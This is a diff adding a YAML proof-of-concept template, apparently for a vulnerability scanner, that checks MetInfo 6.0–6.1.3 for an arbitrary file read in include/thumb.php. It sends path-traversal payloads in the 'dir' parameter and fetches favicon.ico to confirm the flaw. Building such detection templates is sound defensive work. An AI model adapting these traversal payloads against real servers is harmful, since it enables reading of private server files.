@@ -1,0 +1,27 @@
+id: poc-yaml-metinfo-include-thumb-read-any-file
+info:
+  name: Metinfo 6.0 include/thumb.php 文件任意读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: MetInfo
+  description: MetInfo v6.0 - v6.1.3 版本中存在一处任意文件读取漏洞。攻击者可以通过修改 thumb.php 中的 dir 参数来读取服务器上的任意文件。
+  osprey-id: vb_2018_0024
+requests:
+- method: GET
+  path: /include/thumb.php?dir=http/...././/...././/favicon.ico
+  expression: 'matches(body, "^\x00\x00.*") && contains(header, "image")
+
+    '
+- method: GET
+  path: /include/thumb.php?dir=http/...././/...././/fav1c0n.ico
+  expression: '!matches(body, "^\x00\x00.*") && !contains(header, "image")
+
+    '
+- method: GET
+  path: /include/thumb.php?dir=http/..././..././favicon.ico
+  expression: 'matches(body, "^\x00\x00.*") && contains(header, "image")
+
+    '
+variables: {}
+transport: http
